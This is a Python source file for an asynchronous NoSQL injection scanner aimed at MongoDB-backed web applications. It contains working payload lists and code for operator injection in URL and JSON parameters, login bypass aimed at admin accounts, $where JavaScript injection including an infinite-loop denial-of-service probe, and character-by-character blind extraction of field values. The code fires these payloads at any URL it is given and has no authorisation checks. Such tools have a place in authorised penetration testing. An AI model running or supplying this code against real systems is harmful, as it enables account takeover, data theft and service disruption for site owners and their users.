"""
NoSQL Injection Scanner v1.0 — MongoDB, CouchDB, Redis Injection Detection

Features:
1. MongoDB operator injection ($gt, $ne, $regex, $where, $exists)
2. JSON body injection (replace string values with operator objects)
3. Authentication bypass testing
4. Boolean-based blind NoSQL via $regex timing
5. JavaScript injection via $where operator
6. URL-encoded operator injection for GET params
7. Array injection for parameter pollution
8. Error-based detection (leaked error messages)

Supports: MongoDB, CouchDB, Redis (via SSRF), Cassandra
Integrates with: WAFDetector, SQLiScanner (shared param extraction)
"""

import re
import asyncio
import aiohttp
import json
import random
import time
import hashlib
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from loguru import logger


# ──────────────────────────────────────────────────────────────────
# Data classes
# ──────────────────────────────────────────────────────────────────

@dataclass
class NoSQLResult:
    """Result of NoSQL injection testing."""
    url: str
    parameter: str
    vulnerable: bool = False
    nosql_type: str = ""          # operator, auth_bypass, js_injection, boolean_blind, error
    dbms: str = ""                # mongodb, couchdb, redis
    payload_used: str = ""
    evidence: str = ""
    data_leaked: str = ""         # Any data extracted
    confidence: float = 0.0
    injection_point: str = "url"  # url, json_body, post_form, header
    severity: str = "high"


# ──────────────────────────────────────────────────────────────────
# Detection heuristics — Check if target might use NoSQL
# ──────────────────────────────────────────────────────────────────

NOSQL_TECH_INDICATORS = [
    # Response headers
    re.compile(r'x-powered-by:\s*(express|node|koa|hapi|meteor|mean)', re.I),
    re.compile(r'server:\s*(mongoose|mongo)', re.I),
    # Body content
    re.compile(r'ObjectId\s*\(\s*["\'][0-9a-f]{24}["\']\s*\)', re.I),  # MongoDB ObjectId
    re.compile(r'"_id"\s*:\s*\{?\s*"\$oid"', re.I),                     # BSON $oid
    re.compile(r'MongoError|MongoClient|mongoose\.Schema', re.I),
    re.compile(r'CouchDB|couchdb|cloudant', re.I),
]

# Error signatures
NOSQL_ERROR_PATTERNS = {
    "mongodb": [
        re.compile(r'MongoError', re.I),
        re.compile(r'MongoServerError', re.I),
        re.compile(r'SyntaxError:.*JSON', re.I),
        re.compile(r'Mongo\.Collection', re.I),
        re.compile(r'\$where|BadValue.*\$where', re.I),
        re.compile(r'MongoDB.*exception', re.I),
        re.compile(r'ns not found', re.I),
        re.compile(r'can\'t canonicalize query', re.I),
        re.compile(r'\$[a-z]+.*operator', re.I),
        re.compile(r'BSONObj size:.*invalid', re.I),
        re.compile(r'assertion.*src/mongo', re.I),
    ],
    "couchdb": [
        re.compile(r'error.*couchdb', re.I),
        re.compile(r'"error"\s*:\s*"not_found"', re.I),
        re.compile(r'_design/.*_view/', re.I),
        re.compile(r'org\.apache\.couchdb', re.I),
    ],
    "redis": [
        re.compile(r'WRONGTYPE Operation', re.I),
        re.compile(r'ERR.*redis', re.I),
        re.compile(r'Redis\.Cluster', re.I),
    ],
}


# ──────────────────────────────────────────────────────────────────
# Payload databases
# ──────────────────────────────────────────────────────────────────

# ── URL parameter injection (GET encoding) ──
# These convert param=value to param[$ne]=value (MongoDB operator injection via PHP/Express parsing)
URL_OPERATOR_PAYLOADS = [
    # Basic operator injection
    ("[$ne]", "1"),                     # Not equal — bypasses equality checks
    ("[$gt]", ""),                      # Greater than empty string — matches everything
    ("[$gte]", ""),                     # Greater than or equal
    ("[$lt]", "zzzzz"),                 # Less than — matches most strings
    ("[$exists]", "true"),              # Field exists
    ("[$regex]", ".*"),                 # Regex match everything
    ("[$regex]", "^a"),                 # Regex starts with 'a'
    ("[$in][]", "admin"),              # Array $in operator
    ("[$nin][]", "impossible_value"),   # Not in array
]

# ── Authentication bypass payloads ──
AUTH_BYPASS_JSON = [
    # Classic auth bypass — username/password as operators
    {"username": {"$ne": ""}, "password": {"$ne": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": {"$ne": "nonexistent"}, "password": {"$ne": "nonexistent"}},
    # Admin-targeted
    {"username": "admin", "password": {"$ne": ""}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
    # Email-based
    {"email": {"$ne": ""}, "password": {"$ne": ""}},
    {"email": {"$gt": ""}, "password": {"$gt": ""}},
    {"email": {"$regex": ".*@.*"}, "password": {"$ne": ""}},
]

# URL-encoded auth bypass (for traditional form POST)
AUTH_BYPASS_URL = [
    {"username[$ne]": "", "password[$ne]": ""},
    {"username[$gt]": "", "password[$gt]": ""},
    {"username[$regex]": ".*", "password[$regex]": ".*"},
    {"username": "admin", "password[$ne]": ""},
    {"email[$ne]": "", "password[$ne]": ""},
    {"username[$exists]": "true", "password[$exists]": "true"},
]

# ── JavaScript injection via $where ──
JS_INJECTION_PAYLOADS = [
    "1; return true",
    "1; return true;//",
    "'; return true; var a='",
    "1 || true",
    "this.password.match(/.*/)",
    "function(){return true}",
    "1;sleep(5000)",                    # Time-based blind
    "1;while(true){;}",                 # DoS probe (careful!)
]

# ── JSON body operator injection ──
# For APIs that accept JSON bodies {"param": "value"} → {"param": {"$ne": ""}}
JSON_OPERATOR_PAYLOADS = [
    {"$ne": ""},
    {"$gt": ""},
    {"$ne": 1},
    {"$gt": -1},
    {"$regex": ".*"},
    {"$exists": True},
    {"$in": ["admin", "root", "test"]},
    {"$where": "1"},
    {"$or": [{"x": 1}]},
]


# ──────────────────────────────────────────────────────────────────
# NoSQL Scanner
# ──────────────────────────────────────────────────────────────────

class NoSQLScanner:
    """NoSQL injection detection engine — MongoDB, CouchDB, Redis."""

    def __init__(self, config=None):
        self.config = config
        self.timeout = 15
        self.max_params = 8
        self._semaphore = asyncio.Semaphore(3)

    # ──────────────────────────────────────────────────────────
    # Main entry point
    # ──────────────────────────────────────────────────────────

    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        waf_name: str = None,
        html_body: str = None,
    ) -> List[NoSQLResult]:
        """
        Full NoSQL injection scan.
        
        1. Check if target likely uses NoSQL (tech indicators)
        2. URL parameter operator injection ($ne, $gt, $regex)
        3. JSON body operator injection (if API endpoint)
        4. Authentication bypass testing (if login form found)
        5. JavaScript $where injection
        6. Error-based detection
        
        Args:
            url: Target URL
            session: aiohttp session
            waf_name: Detected WAF name
            html_body: Pre-fetched HTML (optional)
            
        Returns:
            List of NoSQLResult
        """
        results = []

        # Step 0: Fetch page if not provided
        if not html_body:
            try:
                async with session.get(url, ssl=False,
                                      timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    html_body = await resp.text(errors='replace')
                    headers = dict(resp.headers)
            except Exception as e:
                logger.debug(f"[NoSQL] Failed to fetch {url}: {e}")
                return results
        else:
            headers = {}

        # Step 1: Tech detection — is NoSQL likely?
        is_nosql_likely = self._detect_nosql_tech(html_body, headers)
        detected_db = self._detect_db_type(html_body, headers)

        # Step 2: URL parameter injection
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if params:
            url_results = await self._test_url_params(url, params, session, detected_db)
            results.extend(url_results)

        # Step 3: JSON body injection (for API-like endpoints)
        if self._is_api_endpoint(url, html_body, headers):
            json_results = await self._test_json_body(url, params, session, detected_db)
            results.extend(json_results)

        # Step 4: Auth bypass (if login form detected)
        if self._has_login_form(html_body):
            auth_results = await self._test_auth_bypass(url, html_body, session)
            results.extend(auth_results)

        # Step 5: Error-based detection from initial responses
        error_db = self._check_errors(html_body)
        if error_db and not results:
            results.append(NoSQLResult(
                url=url,
                parameter="(error-based)",
                vulnerable=True,
                nosql_type="error",
                dbms=error_db,
                evidence=f"NoSQL error signature detected: {error_db}",
                confidence=0.6,
                severity="medium",
            ))

        if results:
            logger.info(f"[NoSQL] Found {len(results)} NoSQL injection issues on {url[:60]}")

        return results

    # ──────────────────────────────────────────────────────────
    # Tech detection
    # ──────────────────────────────────────────────────────────

    def _detect_nosql_tech(self, body: str, headers: Dict) -> bool:
        """Check if the target likely uses a NoSQL database."""
        header_str = '\n'.join(f"{k}: {v}" for k, v in headers.items()) if headers else ""
        combined = header_str + '\n' + body

        for pattern in NOSQL_TECH_INDICATORS:
            if pattern.search(combined):
                return True

        # Check for common NoSQL-backed frameworks
        frameworks = ['express', 'meteor', 'mean', 'mern', 'koa', 'hapi', 'next.js', 'nuxt']
        for fw in frameworks:
            if fw.lower() in combined.lower():
                return True

        return False

    def _detect_db_type(self, body: str, headers: Dict) -> str:
        """Try to identify the specific NoSQL database."""
        combined = str(headers) + '\n' + body if headers else body

        for db, patterns in NOSQL_ERROR_PATTERNS.items():
            for pat in patterns:
                if pat.search(combined):
                    return db

        # Heuristic: ObjectId → MongoDB
        if re.search(r'[0-9a-f]{24}', body):
            return "mongodb"

        return ""

    def _is_api_endpoint(self, url: str, body: str, headers: Dict) -> bool:
        """Check if URL is likely a JSON API endpoint."""
        # URL patterns
        if '/api/' in url or '/v1/' in url or '/v2/' in url or '/graphql' in url:
            return True
        # Content-Type hints
        ct = str(headers.get('Content-Type', headers.get('content-type', '')))
        if 'application/json' in ct:
            return True
        # Body looks like JSON
        body_stripped = body.strip()
        if body_stripped.startswith('{') or body_stripped.startswith('['):
            return True
        return False

    def _has_login_form(self, body: str) -> bool:
        """Check if page contains a login form."""
        login_indicators = [
            re.compile(r'<form[^>]*(?:login|signin|auth|account)', re.I),
            re.compile(r'<input[^>]*name=["\'](?:username|email|user|login)', re.I),
            re.compile(r'<input[^>]*type=["\']password["\']', re.I),
            re.compile(r'(?:log\s*in|sign\s*in|authenticate)', re.I),
        ]
        matches = sum(1 for p in login_indicators if p.search(body))
        return matches >= 2  # At least 2 indicators

    def _check_errors(self, body: str) -> str:
        """Check for NoSQL error messages in response."""
        for db, patterns in NOSQL_ERROR_PATTERNS.items():
            for pat in patterns:
                if pat.search(body):
                    return db
        return ""

    # ──────────────────────────────────────────────────────────
    # URL parameter operator injection
    # ──────────────────────────────────────────────────────────

    async def _test_url_params(
        self, url: str, params: Dict, session: aiohttp.ClientSession,
        detected_db: str = "",
    ) -> List[NoSQLResult]:
        """Test URL parameters with NoSQL operator injection."""
        results = []
        parsed = urlparse(url)
        param_names = list(params.keys())[:self.max_params]

        # Get baseline response
        try:
            async with session.get(url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline_body = await resp.text(errors='replace')
                baseline_status = resp.status
                baseline_len = len(baseline_body)
        except Exception:
            return results

        for pname in param_names:
            async with self._semaphore:
                for operator_suffix, operator_value in URL_OPERATOR_PAYLOADS:
                    try:
                        # Build injected URL: param[$ne]=value
                        new_params = {}
                        for k, v in params.items():
                            if k == pname:
                                new_params[k + operator_suffix] = operator_value
                            else:
                                new_params[k] = v[0] if isinstance(v, list) else v

                        new_query = urlencode(new_params, doseq=False)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                              parsed.params, new_query, parsed.fragment))

                        async with session.get(test_url, ssl=False,
                                              timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                            body = await resp.text(errors='replace')
                            status = resp.status

                        # Detect successful injection
                        vuln_detected = False
                        evidence = ""
                        confidence = 0.0

                        # Check for NoSQL errors (triggered by invalid operator)
                        error_db = self._check_errors(body)
                        if error_db:
                            vuln_detected = True
                            evidence = f"NoSQL error triggered with {operator_suffix}: {error_db}"
                            confidence = 0.75
                            detected_db = error_db

                        # Check for significant response difference
                        # $ne="" should return different results than normal query
                        elif operator_suffix == "[$ne]":
                            body_diff = abs(len(body) - baseline_len)
                            if body_diff > 200 and status == 200:
                                # Different content returned — operator was processed
                                vuln_detected = True
                                evidence = (f"Response diff with {operator_suffix}: "
                                          f"baseline={baseline_len}, injected={len(body)} "
                                          f"(diff={body_diff})")
                                confidence = 0.65

                        # $regex=.* returning more data than normal
                        elif operator_suffix == "[$regex]" and operator_value == ".*":
                            if len(body) > baseline_len * 1.5 and status == 200:
                                vuln_detected = True
                                evidence = f"$regex wildcard returned more data: {len(body)} vs {baseline_len}"
                                confidence = 0.7

                        if vuln_detected:
                            results.append(NoSQLResult(
                                url=url,
                                parameter=pname,
                                vulnerable=True,
                                nosql_type="operator",
                                dbms=detected_db or "mongodb",
                                payload_used=f"{pname}{operator_suffix}={operator_value}",
                                evidence=evidence,
                                confidence=confidence,
                                injection_point="url",
                            ))
                            break  # Found vuln, move to next param

                        await asyncio.sleep(random.uniform(0.1, 0.2))

                    except Exception as e:
                        logger.debug(f"[NoSQL] URL param test error: {e}")

        return results

    # ──────────────────────────────────────────────────────────
    # JSON body injection
    # ──────────────────────────────────────────────────────────

    async def _test_json_body(
        self, url: str, params: Dict, session: aiohttp.ClientSession,
        detected_db: str = "",
    ) -> List[NoSQLResult]:
        """Test JSON body injection for API endpoints."""
        results = []

        # Build a base JSON body from URL params or common fields
        if params:
            base_body = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        else:
            base_body = {"id": "1", "query": "test"}

        # Get baseline
        try:
            async with session.post(url, json=base_body, ssl=False,
                                   timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                baseline_body = await resp.text(errors='replace')
                baseline_status = resp.status
                baseline_len = len(baseline_body)
        except Exception:
            return results

        # Test each parameter with operator payloads
        for pname in list(base_body.keys())[:self.max_params]:
            for operator_payload in JSON_OPERATOR_PAYLOADS[:5]:
                try:
                    test_body = dict(base_body)
                    test_body[pname] = operator_payload

                    async with session.post(url, json=test_body, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout),
                                           headers={"Content-Type": "application/json"}) as resp:
                        body = await resp.text(errors='replace')
                        status = resp.status

                    # Check for indication of injection
                    error_db = self._check_errors(body)
                    body_diff = abs(len(body) - baseline_len)

                    if error_db:
                        results.append(NoSQLResult(
                            url=url,
                            parameter=pname,
                            vulnerable=True,
                            nosql_type="operator",
                            dbms=error_db,
                            payload_used=json.dumps({pname: operator_payload}),
                            evidence=f"JSON operator injection triggered {error_db} error",
                            confidence=0.8,
                            injection_point="json_body",
                        ))
                        break

                    # Response changed significantly → operator was processed
                    if body_diff > 200 and status == 200 and status == baseline_status:
                        results.append(NoSQLResult(
                            url=url,
                            parameter=pname,
                            vulnerable=True,
                            nosql_type="operator",
                            dbms=detected_db or "mongodb",
                            payload_used=json.dumps({pname: operator_payload}),
                            evidence=f"JSON body response diff: {body_diff} bytes",
                            confidence=0.65,
                            injection_point="json_body",
                        ))
                        break

                except Exception as e:
                    logger.debug(f"[NoSQL] JSON body test error: {e}")

        # Test $where JavaScript injection
        for pname in list(base_body.keys())[:3]:
            for js_payload in JS_INJECTION_PAYLOADS[:3]:
                try:
                    test_body = dict(base_body)
                    test_body["$where"] = js_payload

                    async with session.post(url, json=test_body, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')
                        status = resp.status

                    if status == 200 and abs(len(body) - baseline_len) > 100:
                        results.append(NoSQLResult(
                            url=url,
                            parameter="$where",
                            vulnerable=True,
                            nosql_type="js_injection",
                            dbms="mongodb",
                            payload_used=json.dumps({"$where": js_payload}),
                            evidence=f"$where JS injection changed response",
                            confidence=0.75,
                            injection_point="json_body",
                            severity="critical",
                        ))
                        break

                except Exception:
                    continue

        return results

    # ──────────────────────────────────────────────────────────
    # Authentication bypass
    # ──────────────────────────────────────────────────────────

    async def _test_auth_bypass(
        self, url: str, html_body: str, session: aiohttp.ClientSession,
    ) -> List[NoSQLResult]:
        """Test login forms for NoSQL authentication bypass."""
        results = []

        # Extract form action
        from bs4 import BeautifulSoup
        try:
            soup = BeautifulSoup(html_body, 'html.parser')
        except Exception:
            return results

        # Find login forms
        forms = soup.find_all('form')
        login_form = None
        for form in forms:
            inputs = form.find_all('input')
            has_password = any(
                i.get('type', '').lower() == 'password' for i in inputs
            )
            if has_password:
                login_form = form
                break

        if not login_form:
            return results

        action = login_form.get('action', '')
        method = login_form.get('method', 'post').lower()
        from urllib.parse import urljoin
        action_url = urljoin(url, action) if action else url

        # Determine content type
        enctype = login_form.get('enctype', 'application/x-www-form-urlencoded')
        is_json = 'json' in enctype.lower() or self._is_api_endpoint(url, html_body, {})

        # Get baseline (normal failed login)
        normal_data = {"username": "admin", "password": "wrong_password_12345"}
        try:
            if is_json:
                async with session.post(action_url, json=normal_data, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    baseline = await resp.text(errors='replace')
                    baseline_status = resp.status
            else:
                async with session.post(action_url, data=normal_data, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                    baseline = await resp.text(errors='replace')
                    baseline_status = resp.status
        except Exception:
            return results

        # Test auth bypass payloads
        payloads = AUTH_BYPASS_JSON if is_json else AUTH_BYPASS_URL

        for payload in payloads[:5]:
            try:
                if is_json:
                    async with session.post(action_url, json=payload, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')
                        status = resp.status
                else:
                    async with session.post(action_url, data=payload, ssl=False,
                                           timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')
                        status = resp.status

                # Detect successful bypass
                bypass_detected = False
                evidence = ""

                # Check for NoSQL error
                error_db = self._check_errors(body)
                if error_db:
                    bypass_detected = True
                    evidence = f"Auth bypass triggered {error_db} error"

                # Check for redirect to dashboard/profile/home (bypass success)
                if status in (301, 302, 303, 307):
                    location = str(resp.headers.get('Location', ''))
                    if any(x in location.lower() for x in ['dashboard', 'home', 'profile', 'admin', 'welcome']):
                        bypass_detected = True
                        evidence = f"Auth bypass redirected to: {location}"

                # Check for significant response difference
                if abs(len(body) - len(baseline)) > 500 and status == 200:
                    # Check for success indicators
                    success_words = ['welcome', 'dashboard', 'logout', 'profile', 'settings', 'account']
                    if any(w in body.lower() for w in success_words):
                        bypass_detected = True
                        evidence = f"Auth bypass: response contains success indicators"

                if bypass_detected:
                    results.append(NoSQLResult(
                        url=action_url,
                        parameter="login",
                        vulnerable=True,
                        nosql_type="auth_bypass",
                        dbms="mongodb",
                        payload_used=json.dumps(payload) if is_json else str(payload),
                        evidence=evidence,
                        confidence=0.85,
                        injection_point="json_body" if is_json else "post_form",
                        severity="critical",
                    ))
                    break  # One bypass is enough

                await asyncio.sleep(random.uniform(0.3, 0.5))

            except Exception as e:
                logger.debug(f"[NoSQL] Auth bypass test error: {e}")

        return results

    # ──────────────────────────────────────────────────────────
    # Boolean-based blind NoSQL
    # ──────────────────────────────────────────────────────────

    async def scan_blind(
        self, url: str, param: str, session: aiohttp.ClientSession,
    ) -> Optional[NoSQLResult]:
        """Boolean-based blind NoSQL injection via $regex."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if param not in params:
            return None

        # Baseline: true condition
        try:
            true_params = {k: (v[0] if isinstance(v, list) else v) for k, v in params.items()}
            true_params[f"{param}[$regex]"] = ".*"
            if param in true_params:
                del true_params[param]
            true_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, urlencode(true_params), parsed.fragment))

            async with session.get(true_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                true_body = await resp.text(errors='replace')
                true_len = len(true_body)
        except Exception:
            return None

        # False condition
        try:
            false_params = {k: (v[0] if isinstance(v, list) else v) for k, v in params.items()}
            false_params[f"{param}[$regex]"] = "^impossible_value_xyz_99999$"
            if param in false_params:
                del false_params[param]
            false_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(false_params), parsed.fragment))

            async with session.get(false_url, ssl=False,
                                  timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                false_body = await resp.text(errors='replace')
                false_len = len(false_body)
        except Exception:
            return None

        # If true and false responses differ significantly → blind NoSQL
        diff = abs(true_len - false_len)
        if diff > 100:
            return NoSQLResult(
                url=url,
                parameter=param,
                vulnerable=True,
                nosql_type="boolean_blind",
                dbms="mongodb",
                payload_used=f"{param}[$regex]=.*",
                evidence=f"Boolean blind: true={true_len}, false={false_len} (diff={diff})",
                confidence=0.7,
                injection_point="url",
                severity="high",
            )

        return None

    # ──────────────────────────────────────────────────────────
    # Data extraction (via blind $regex)
    # ──────────────────────────────────────────────────────────

    async def extract_field_blind(
        self, url: str, param: str, session: aiohttp.ClientSession,
        charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
        max_length: int = 32,
    ) -> str:
        """Extract a field value character by character using $regex blind."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        extracted = ""

        for pos in range(max_length):
            found_char = False
            for ch in charset:
                test_regex = f"^{re.escape(extracted + ch)}"
                try:
                    test_params = {k: (v[0] if isinstance(v, list) else v) for k, v in params.items()}
                    test_params[f"{param}[$regex]"] = test_regex
                    if param in test_params:
                        del test_params[param]
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                          parsed.params, urlencode(test_params), parsed.fragment))

                    async with session.get(test_url, ssl=False,
                                          timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                        body = await resp.text(errors='replace')

                    # "True" response means the char matches
                    # You'd need to know what the "true" response looks like
                    # (this is a simplified version)
                    if len(body) > 1000:  # Assume larger response = match
                        extracted += ch
                        found_char = True
                        logger.debug(f"[NoSQL] Extracted: {extracted}")
                        break

                except Exception:
                    continue

            if not found_char:
                break

            await asyncio.sleep(0.1)

        return extracted
